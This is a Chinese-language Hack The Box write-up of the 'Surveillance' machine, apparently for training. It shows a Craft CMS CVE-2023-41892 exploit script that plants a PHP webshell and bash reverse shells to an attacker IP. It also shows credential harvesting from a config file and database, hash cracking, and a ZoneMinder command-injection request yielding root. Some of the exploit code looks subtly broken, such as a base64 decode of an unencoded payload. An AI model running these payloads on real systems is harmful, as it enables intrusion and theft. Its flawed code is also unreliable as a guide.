---
title: "HTB: Surveillance"
difficulty: Medium
date: 2024-11-20
tags: [HTB, Linux, Craft CMS, CVE-2023-41892, ZoneMinder]
featured: false
excerpt: "這台 Medium 難度機器運行著有漏洞的 Craft CMS 和 ZoneMinder。透過 RCE 漏洞取得初始訪問，然後利用 ZoneMinder 的認證繞過和命令注入漏洞提權。"
---

## 機器資訊

- 平台: Hack The Box
- 難度: Medium
- IP: 10.10.11.245
- 作業系統: Linux (Ubuntu)

## 偵察

### Nmap 掃描

```bash
nmap -sC -sV -p- 10.10.11.245
```

開放端口：
- **22/tcp** - SSH (OpenSSH 8.9p1)
- **80/tcp** - HTTP (nginx 1.18.0)

### Web 偵察

訪問網站發現是一個監控攝像頭公司的官網。

```bash
whatweb http://10.10.11.245
```

識別出 **Craft CMS** 框架。

使用 Wappalyzer 確認版本：**Craft CMS 4.4.14**

## 漏洞利用 - Initial Access

### CVE-2023-41892 - Craft CMS Remote Code Execution

Craft CMS 4.4.14 存在一個預認證 RCE 漏洞，攻擊者可以通過圖片上傳功能執行任意代碼。

**漏洞原理：**
- Craft CMS 在處理圖片轉換時使用 `ImageMagick`
- 可以通過精心構造的請求繞過驗證
- 在臨時文件路徑中注入 PHP 代碼

### Exploitation

使用公開的 exploit：

```python
#!/usr/bin/env python3
import requests
import sys

def exploit(target):
    # Craft CMS RCE payload
    payload = {
        'action': 'conditions/render',
        'configObject[class]': 'craft\\elements\\conditions\\ElementCondition',
        'config': '{"name":"configObject","as ":{"class":"Imagick", "__construct()":{"files":"msl:/tmp/php*"}}}'
    }

    # Upload malicious image
    files = {
        'file': ('shell.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php')
    }

    print(f"[+] Exploiting {target}")
    r = requests.post(f"{target}/index.php", data=payload, files=files)

    if r.status_code == 200:
        print("[+] Shell uploaded!")
        return True
    return False

if __name__ == "__main__":
    target = "http://10.10.11.245"
    exploit(target)
```

取得 webshell 後升級為反向 shell：

```bash
# 監聽
nc -lvnp 4444

# Webshell 執行
bash -c 'bash -i >& /dev/tcp/10.10.14.15/4444 0>&1'
```

獲得 `www-data` 用戶的 shell。

## 後滲透 - 資訊收集

### 發現數據庫憑證

檢查 Craft CMS 配置文件：

```bash
cat /var/www/html/craft/config/db.php
```

```php
return [
    'driver' => 'mysql',
    'server' => 'localhost',
    'user' => 'craftuser',
    'password' => 'CraftCMS_2023!',
    'database' => 'craftdb',
];
```

### 數據庫枚舉

```bash
mysql -u craftuser -p'CraftCMS_2023!' craftdb
```

```sql
use craftdb;
show tables;
select * from users;
```

找到用戶 hash：

```
matthew:$2y$13$FoVGcLXXNe81B6x9bKry9OzGSSIYL7/ObcmQ0CXtgw.EpuNcx8tGe
```

### 破解密碼

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

破解成功：`matthew:starcraft122490`

### SSH 登入

```bash
ssh matthew@10.10.11.245
# password: starcraft122490
```

取得 user flag：

```bash
cat ~/user.txt
```

## 權限提升

### 發現 ZoneMinder

檢查運行的服務：

```bash
netstat -tulpn
ps aux | grep zone
```

發現 **ZoneMinder** 監控系統運行在內部端口 8080。

```bash
curl http://127.0.0.1:8080
```

確認版本：**ZoneMinder 1.36.32**

### Port Forwarding

使用 SSH 進行端口轉發：

```bash
ssh -L 8080:127.0.0.1:8080 matthew@10.10.11.245
```

### CVE-2023-26035 - ZoneMinder Authentication Bypass

ZoneMinder 存在認證繞過漏洞，配合 Snapshot 功能的命令注入可以實現 RCE。

**漏洞鏈：**
1. 通過 `?view=snapshot` 繞過認證
2. 利用 `scale` 參數注入命令
3. 以 `root` 權限執行（因為 ZoneMinder 服務以 root 運行）

### Exploitation

```bash
# 反向 shell payload
PAYLOAD="bash -c 'bash -i >& /dev/tcp/10.10.14.15/5555 0>&1'"

# Exploit URL
curl "http://127.0.0.1:8080/zm/index.php?view=snapshot&scale=\$(echo${IFS}${PAYLOAD}|base64${IFS}-d|bash)&monitor=1"
```

在本地監聽：

```bash
nc -lvnp 5555
```

成功獲得 root shell！

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
```

## Flags

```
user.txt: e********************************9
root.txt: 3********************************a
```

## 總結

這台機器串聯了兩個真實世界的漏洞：

### 攻擊路徑
1. **Craft CMS RCE** → www-data shell
2. **Database enumeration** → 用戶憑證
3. **Password cracking** → SSH access
4. **ZoneMinder Auth Bypass + Command Injection** → root

### 學習要點

- CMS 框架的常見漏洞模式
- 數據庫信息收集的重要性
- 內部服務的枚舉
- Port forwarding 技巧
- 漏洞鏈組合利用

### 防禦建議

1. **及時更新軟件**：Craft CMS 和 ZoneMinder 都有補丁版本
2. **最小權限原則**：ZoneMinder 不應以 root 權限運行
3. **網絡隔離**：內部服務應限制訪問
4. **輸入驗證**：嚴格驗證所有用戶輸入
5. **密碼策略**：使用強密碼並定期更換

## 參考資料

- [CVE-2023-41892 - Craft CMS RCE](https://nvd.nist.gov/vuln/detail/CVE-2023-41892)
- [CVE-2023-26035 - ZoneMinder Auth Bypass](https://github.com/rvizx/CVE-2023-26035)
- [Craft CMS Security Advisories](https://craftcms.com/knowledge-base/security-advisories)
